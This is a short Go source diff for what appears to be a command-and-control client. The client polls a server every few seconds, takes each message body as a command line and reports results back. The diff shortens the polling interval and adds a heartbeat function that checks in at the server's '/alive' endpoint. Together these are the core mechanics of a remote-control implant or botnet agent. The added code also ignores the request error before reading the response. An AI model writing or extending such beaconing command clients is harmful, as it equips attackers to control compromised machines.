@@ -5,6 +5,7 @@ import (
 	"dominant/server"
 	"fmt"
 	"io"
+	"log"
 	"math/rand"
 	"net/http"
 	"strconv"
@@ -39,9 +40,9 @@ func init() {
 }
 
 func main() {
-	fmt.Println(ID)
+	log.Println(ID)
 	for {
-		time.Sleep(10 * time.Second)
+		time.Sleep(5 * time.Second)
 		msg := getMessage()
 		if msg != nil {
 			cmdLine := msg.Body
@@ -72,6 +73,18 @@ func getMessage() *message.Message {
 		return nil
 	}
 	return msg
+}
+
+func alive() {
+	url := fmt.Sprintf("%s/alive", BaseUrl)
+	req, _ := http.NewRequest("POST", url, nil)
+	resp, err := client.Do(req)
+	body, err := io.ReadAll(resp.Body)
+	msg := &message.Message{}
+	err = msg.MessageJsonUnMarshal(body)
+	if err != nil {
+		return
+	}
 }
 
 func postFeedback(m *message.Message) {
